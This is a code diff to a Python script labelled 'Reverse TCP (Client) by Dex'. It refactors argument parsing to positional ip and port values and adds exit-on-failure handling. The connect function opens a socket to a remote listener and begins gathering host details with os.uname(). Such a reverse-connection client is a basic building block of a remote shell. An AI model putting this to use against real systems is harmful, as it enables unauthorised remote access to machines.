@@ -7,36 +7,20 @@ def usage():
 
 	print("\nReverse TCP (Client) by Dex")
 	print()
-	print("Usage: connect.py -i <ip> -p <port>")
-	print("Example: connect.py -i 192.168.0.4 -p 8000")
-	print("Example: connect.py -i 62.37.142.7 -p 1337")
+	print("Usage: connect.py <ip> <port>")
+	print("Example: connect.py 192.168.0.4 8000")
+	print("Example: connect.py 62.37.142.7 1337")
 	sys.exit(0)
 
 
 def main():
-	ip = ''
-	port = 0
-
-	if not len(sys.argv[1:]):
-		usage()
 	try:
-		opts, args = getopt.getopt(sys.argv[1:], "hi:p:",["help","ip=","port="])
-	except getopt.GetoptError as err:
-		print(str(err))
+		ip = str(sys.argv[1])
+		port = int(sys.argv[2])
+	except:
+		print("[!] No Arguments Specified!")
 		usage()
-
-	for o,a in opts:
-		if o in ("-h","--help"):
-			usage()
-		elif o in ("-i","--ip"):
-			ip = str(sys.argv[2])
-		elif o in ("-p","--port"):
-			try:
-				port = int(sys.argv[4])
-			except:
-				exit("[!] Port parameter requires number.\n%s was supplied." % (port))
-		else:
-			assert False,"Unhandled Option"
+		sys.exit(1)
 	connect(ip,port)
 
 def connect(ip,port):
@@ -46,6 +30,7 @@ def connect(ip,port):
 			s.connect((ip,port))
 		except:
 			print("[!] Unable to connect! Is server listening?")
+			sys.exit(1)
 
 		x_info = ""
 		for x in os.uname():
